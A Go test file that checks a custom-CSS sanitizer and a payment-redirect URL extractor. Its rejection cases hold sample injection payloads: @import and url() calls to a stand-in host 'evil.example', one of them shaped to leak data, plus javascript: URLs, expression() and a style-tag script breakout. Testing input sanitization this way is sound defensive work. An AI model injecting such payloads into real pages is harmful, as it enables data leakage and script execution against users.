package domain

import (
	"errors"
	"strings"
	"testing"
)

func TestSanitizeCustomCSS_AllowsSafeScopedRules(t *testing.T) {
	css := ".rtylr-menu-root { --menu-accent: #c8a96e; letter-spacing: 0.02em; }"
	got, err := SanitizeCustomCSS(css)
	if err != nil {
		t.Fatalf("expected valid CSS, got error: %v", err)
	}
	if got != css {
		t.Fatalf("unexpected sanitized CSS: %q", got)
	}
}

func TestSanitizeCustomCSS_RejectsDangerousDirectives(t *testing.T) {
	cases := []string{
		"@import url('https://evil.example/a.css');",
		"body { background: url(https://evil.example/leak?x=1); }",
		"a { background: url(javascript:alert(1)); }",
		"div { width: expression(alert(1)); }",
		"</style><script>alert(1)</script>",
		strings.Repeat("a", MaxCustomCSSBytes+1),
	}
	for _, tc := range cases {
		if _, err := SanitizeCustomCSS(tc); !errors.Is(err, ErrUnsafeCustomCSS) {
			t.Fatalf("expected ErrUnsafeCustomCSS for %q, got %v", tc, err)
		}
	}
}

func TestExtractPaymentRedirectURL(t *testing.T) {
	cfg := `{"payment":{"mode":"redirect","redirectUrl":"https://pay.example.com/checkout"}}`
	if got := ExtractPaymentRedirectURL(cfg); got != "https://pay.example.com/checkout" {
		t.Fatalf("expected redirect URL, got %q", got)
	}

	posCfg := `{"payment":{"mode":"pos","redirectUrl":"https://pay.example.com/checkout"}}`
	if got := ExtractPaymentRedirectURL(posCfg); got != "" {
		t.Fatalf("expected empty URL in pos mode, got %q", got)
	}

	badScheme := `{"payment":{"mode":"redirect","redirectUrl":"javascript:alert(1)"}}`
	if got := ExtractPaymentRedirectURL(badScheme); got != "" {
		t.Fatalf("expected empty URL for javascript scheme, got %q", got)
	}
}
